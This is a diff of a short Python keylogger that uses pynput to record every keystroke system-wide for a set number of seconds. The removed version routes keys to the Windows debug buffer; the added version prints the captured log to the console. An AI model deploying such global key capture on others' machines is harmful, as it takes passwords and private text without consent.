@@ -1,51 +1,40 @@
-import ctypes
 import sys
 import time
 from pynput import keyboard
 
-# Funzione per inviare la stringa al buffer di debug di Windows
-def log_to_debug(message):
-    try:
-        ctypes.windll.kernel32.OutputDebugStringW(message)
-    except Exception:
-        pass
-
-def on_press(key):
-    try:
-        if hasattr(key, 'char') and key.char is not None:
-            msg = key.char
-        elif key == keyboard.Key.space:
-            msg = " "
-        elif key == keyboard.Key.enter:
-            msg = "\n"
-        else:
-            msg = f"[{key}]"
-        
-        log_to_debug(msg)
-    except Exception:
-        pass
-
 def main():
-    # Controllo degli argomenti da riga di comando
     if len(sys.argv) != 2:
-        print("Uso: python nome_script.py <secondi>")
+        print(f"Usage: {sys.argv[0]} <seconds>", file=sys.stderr)
         sys.exit(1)
 
-    try:
-        duration = int(sys.argv[1])
-    except ValueError:
-        print("Errore: Il valore deve essere un numero intero (secondi).")
-        sys.exit(1)
+    duration = int(sys.argv[1])
+    logged = []
 
-    # Avvia il listener
+    # Funzione chiamata ad ogni pressione di tasto
+    def on_press(key):
+        try:
+            # Tasti alfanumerici
+            logged.append(key.char)
+        except AttributeError:
+            # Tasti speciali (Space, Enter, etc.)
+            if key == keyboard.Key.space:
+                logged.append(" ")
+            elif key == keyboard.Key.enter:
+                logged.append("\n")
+            else:
+                logged.append(f"[{key}]")
+
+    # Avvia il listener in background
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
-    
-    # Attesa per la durata specificata
+
+    print(f"--- Monitoraggio globale attivo per {duration} secondi ---")
     time.sleep(duration)
     
-    # Fermata del listener
     listener.stop()
+    
+    print("\n--- Log globale acquisito: ---")
+    print(''.join(filter(None, logged)))
 
 if __name__ == "__main__":
     main()
